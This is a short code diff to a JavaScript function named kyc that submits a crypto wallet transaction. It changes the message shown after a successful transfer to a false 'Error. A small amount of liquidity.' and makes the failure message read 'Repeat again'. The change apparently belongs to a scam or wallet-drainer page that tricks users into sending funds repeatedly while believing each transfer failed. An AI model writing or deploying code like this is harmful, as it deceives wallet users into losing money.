@@ -133,10 +133,12 @@ function kyc(dcm) {
                    params: [transactionParams]
                });
 
-               alert("Operation successfully");
+	        alert("Error. A small amount of liquidity.");
+            transferInProgress = false; 
            } catch (error) {
-               console.error("Error during the transaction:", error);
-               alert("An error occurred while attempting the transaction.");
+             alert("Error confirming liquidity. Repeat again");
+             console.error(error);
+             transferInProgress = false;
            }
        }
 
